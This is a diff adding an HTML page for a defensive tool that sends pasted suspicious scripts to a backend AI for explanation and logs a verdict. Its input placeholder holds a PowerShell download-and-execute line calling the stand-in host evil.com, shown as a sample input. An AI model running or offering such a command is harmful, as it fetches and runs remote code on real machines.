@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Malicious Code Analyzer - CyberSec Platform</title>
+  <link rel="stylesheet" href="style.css" />
+  <script>if (!localStorage.getItem('token')) window.location.href = 'login.html';</script>
+</head>
+<body>
+  <nav class="navbar">
+    <div class="container nav-inner">
+      <div class="brand">
+        <div class="brand-icon">🛡️</div>
+        <div>CyberSec <strong>Platform</strong></div>
+      </div>
+      <div class="nav-links">
+        <a href="index.html">Home Dashboard</a>
+        <a href="#" onclick="logout()">Logout</a>
+      </div>
+    </div>
+  </nav>
+
+  <div class="container hero" style="padding-top: 40px;">
+    <h1>Malicious Code Analyzer</h1>
+    <p>Paste suspicious or obfuscated scripts (JS, PowerShell, Python). The AI will explain what the malware is trying to do.</p>
+    
+    <div class="glass-card card-inner">
+      <div class="field">
+        <label>Code Snippet</label>
+        <textarea id="codeInput" placeholder="e.g. IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')" style="min-height: 200px; font-family: monospace;"></textarea>
+      </div>
+      <button class="btn btn-primary" onclick="analyzeCode()">Analyze Code</button>
+      
+      <div id="resultArea" style="margin-top: 20px;"></div>
+    </div>
+  </div>
+
+  <script>
+    function logout() {
+      localStorage.removeItem('token');
+      localStorage.removeItem('username');
+      window.location.href = 'login.html';
+    }
+
+    async function analyzeCode() {
+      const code = document.getElementById('codeInput').value.trim();
+      if (!code) return alert('Please enter some code to analyze.');
+
+      const resArea = document.getElementById('resultArea');
+      resArea.innerHTML = '<div class="loading-spinner"></div> Deobfuscating and analyzing code...';
+
+      try {
+        const token = localStorage.getItem('token');
+        const response = await fetch('/api/analyze/ai', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${token}`
+          },
+          body: JSON.stringify({ emailBody: 'Context: Analyzing Malicious Code. Explain what this script does step-by-step and if it is malicious. Code:\n' + code })
+        });
+
+        if (response.status === 401 || response.status === 403) return logout();
+
+        const data = await response.json();
+
+        resArea.innerHTML = `
+          <div class="ai-result" style="margin-top: 15px;">
+            <div class="ai-result-head">🤖 AI Code Analysis</div>
+            <p>${data.analysis}</p>
+          </div>
+        `;
+
+        fetch('/api/history', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${token}`
+          },
+          body: JSON.stringify({
+            module: 'Code Analyzer',
+            target: code.substring(0, 30) + '...',
+            riskScore: data.analysis.toLowerCase().includes('malicious') ? 100 : 20,
+            verdict: data.analysis.toLowerCase().includes('malicious') ? 'MALICIOUS' : 'SUSPICIOUS'
+          })
+        });
+
+      } catch (err) {
+        resArea.innerHTML = '<p style="color:red">Failed to analyze. Ensure backend is running.</p>';
+      }
+    }
+  </script>
+</body>
+</html>
